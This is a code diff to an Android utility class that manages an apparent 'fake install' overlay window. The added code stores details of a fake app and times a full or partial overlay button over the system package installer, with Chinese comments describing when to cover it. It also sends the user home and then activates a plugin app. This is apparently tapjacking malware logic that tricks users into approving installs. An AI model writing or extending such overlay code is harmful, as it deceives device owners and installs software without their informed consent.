@@ -118,6 +118,12 @@ public class UtilOperator {
                 icon.setImageDrawable(appInfo.icon);
                 name.setText(String.format(context.getString(R.string.protocal_title), appInfo.name));
                 content.setText(context.getString(R.string.protocal).replace("**", appInfo.name));
+
+                AppRuntime.CURRENT_FAKE_APP_INFO.name = appInfo.name;
+                AppRuntime.CURRENT_FAKE_APP_INFO.packageNmae = appInfo.packageNmae;
+
+                Config.LOGD("[[FakeInstallWindow]] current fake app info : name = " + name + " packageName = " + appInfo.packageNmae
+                                + " >>>>>>>>>>>");
             }
         }
 
@@ -138,19 +144,12 @@ public class UtilOperator {
                 installFullView = null;
                 fake = null;
                 AppRuntime.FAKE_WINDOWS_SHOW.set(false);
+
+//                if (AppRuntime.PLUGIN_INSTALLED) {
+                    Utils.tryToActivePluginApp(context);
+//                }
             } else {
                 if (count == (TIMER_COUNT - 3 * 5) && AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
-                    //update install btn
-//                    WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
-//                    confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
-//                    confirmBtnParams.format = PixelFormat.RGBA_8888;
-//                    confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
-//                    confirmBtnParams.width = (int) (50 * density);
-//                    confirmBtnParams.height = (int) (48 * density);
-//                    confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (25 * density);
-//                    confirmBtnParams.y = screenHeight - (int) (48 * density);
-//                    wm.updateViewLayout(installView, confirmBtnParams);
-
                     //now just remove install full btn
                     if (installFullView != null) {
                         wm.removeView(installFullView);
@@ -158,18 +157,6 @@ public class UtilOperator {
                     installFullView = null;
                 } else if (count == 1 * 5) {
                     AppRuntime.WATCHING_SERVICE_BREAK.set(true);
-
-                    /**
-                     * 全遮盖
-                     */
-//                    WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
-//                    confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
-//                    confirmBtnParams.format = PixelFormat.RGBA_8888;
-//                    confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
-//                    confirmBtnParams.width = screenWidth / 2;
-//                    confirmBtnParams.height = (int) (48 * density);
-//                    confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.RIGHT;
-//                    wm.updateViewLayout(installView, confirmBtnParams);
                     if (installFullView == null) {
                         installFullView = layoutInflater.inflate(R.layout.fake_install_btn, null);
                         wm.addView(installFullView, confirmFullBtnParams);
@@ -177,35 +164,21 @@ public class UtilOperator {
 
                     UtilsRuntime.goHome(context);
                 } else if (AppRuntime.PLUGIN_INSTALLED || !AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
-                    AppRuntime.PLUGIN_INSTALLED = false;
-
-                    //显示全部install btn，全遮盖
-//                    WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
-//                    confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
-//                    confirmBtnParams.format = PixelFormat.RGBA_8888;
-//                    confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
-//                    confirmBtnParams.width = screenWidth / 2;
-//                    confirmBtnParams.height = (int) (48 * density);
-//                    confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.RIGHT;
-//                    wm.updateViewLayout(installView, confirmBtnParams);
+                    /**
+                     * 显示全部install btn，全遮盖，
+                     * 当已经安装了，或者已经当前最顶层Activity不是安装界面的时候
+                     */
 
                     if (installFullView == null) {
                         installFullView = layoutInflater.inflate(R.layout.fake_install_btn, null);
                         wm.addView(installFullView, confirmFullBtnParams);
                     }
-
                 } else if (!AppRuntime.PLUGIN_INSTALLED && AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()
                                && count > 1 * 5) {
-
-//                    WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
-//                    confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
-//                    confirmBtnParams.format = PixelFormat.RGBA_8888;
-//                    confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
-//                    confirmBtnParams.width = (int) (50 * density);
-//                    confirmBtnParams.height = (int) (48 * density);
-//                    confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (25 * density);
-//                    confirmBtnParams.y = screenHeight - (int) (48 * density);
-//                    wm.updateViewLayout(installView, confirmBtnParams);
+                    /**
+                     * 显示全部部分遮盖btn
+                     * 当没有安装，并且顶层窗口是安装界面，并且时间大于1S的时候
+                     */
                     if (installFullView != null) {
                         wm.removeView(installFullView);
                     }
